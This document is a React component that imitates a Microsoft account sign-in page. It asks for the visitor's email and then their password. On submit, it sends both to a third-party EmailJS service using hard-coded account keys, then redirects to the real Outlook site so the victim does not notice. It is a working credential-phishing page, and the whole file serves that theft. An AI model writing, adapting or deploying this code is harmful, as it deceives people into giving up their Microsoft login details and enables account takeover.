/* eslint-disable jsx-a11y/anchor-is-valid */
/* eslint-disable jsx-a11y/alt-text */
import React, { useRef, useState } from 'react';
import emailjs from '@emailjs/browser';
import doc from "../assets/documentation.svg";
import logo from "../assets/microsoft_logo.svg";
import option_sign from "../assets/signin-options.svg";
import left from "../assets/arrow_left.svg";
import ants from "../assets/marching_ants.gif"

import './login.css';


function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState(1);
  const [showMachine, setShowMachine] = useState(false);
  const [showMachineTimeout, setShowMachineTimeout] = useState(null);
  const form = useRef()

  const handleNext = () => {
    if (email !== '') {
      setStep(2);
      setShowMachine(true);
    clearTimeout(showMachineTimeout); // Effacer le timeout précédent
    setShowMachineTimeout(setTimeout(() => setShowMachine(false), 500)); // Désactiver showMachine après 1 seconde
    } else {
      alert('Veuillez entrer votre adresse e-mail.');
    }
  };

  const sendEmail = (e) => {
    e.preventDefault();
     setShowMachine(true);
      clearTimeout(showMachineTimeout); // Effacer le timeout précédent
      setShowMachineTimeout(setTimeout(() => setShowMachine(false), 2000)); // Désactiver showMachine après 2 secondes
       emailjs.sendForm('service_6imasjg', 'template_drpr0di', form.current, 'c1ER5L44OShcxudaZ')
      .then((result) => {

       
          console.log(result.text);
          // Redirection vers https://www.esso.com
          window.location.href = 'https://outlook.live.com/mail/0/?actSwt=true';
            
        
      })
      .catch((error) => {
        console.log(error.text);
        alert('Une erreur s\'est produite lors de l\'envoi de l\'e-mail.');
      });
  };


  return (
    <div className="middle">
     
      <form className="container" ref={form} onSubmit={sendEmail} > 
      {showMachine && (
      <div className="marchine">
         <img src={ants} />
      </div>
      )}
        
         {/* logo */}
      <div className="logo">
        <img src={logo} className=""/>
      </div>
      {/* end logo */}

      {step === 1 && (
        <><div>

            <label className="heading" htmlFor="email">Sign in</label>
            <input
            className="input-form"
              type="email"
              id="email"
              placeholder="Email, phone, or skype"
              name="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required />

            <div className="form-group">
              No account?
              <span> <a href="#"> Create one!</a> </span>
            </div>
            <div className="row-form-group">
              <div className="form-group form-text"> Sign in with Windows Hello or a security key
              <img src={doc} className="form-image" />
            </div>
            </div>
            <br />
            <div className="btn-row">
               <button className="btn btn-primary" onClick={handleNext}>Next</button>
            </div>
          </div>
             </>

        
      )}

      {step === 2 && (
        <div>
          <div className="user-mail">
            <img src={left} className="left-arrow"/> 
            <p>{email}</p></div>
          <label className="heading" htmlFor="password">Enter password</label>
          
          <br/>
          <input
            type="hidden"
            id="email"
            name="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          
          <input
           className="input-form"
            type="password"
            id="password"
            placeholder="Password"
            name="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />

          <div className="form-group">
            <p className="par-form-group">Forgot password?</p>
          </div>
          <br />
          <div className="btn-row">
          <button className="btn btn-primary" type="submit" >Sign In</button>
          </div>
        </div>
      )}
      </form>

      {step === 1 ? (
        <div className="table">
            <img src={option_sign} className="table-image" alt="" />
            <span className="table-text">Sign-in options</span>
        </div>
    ) : null}
     
    </div>
  );
}

export default LoginForm;
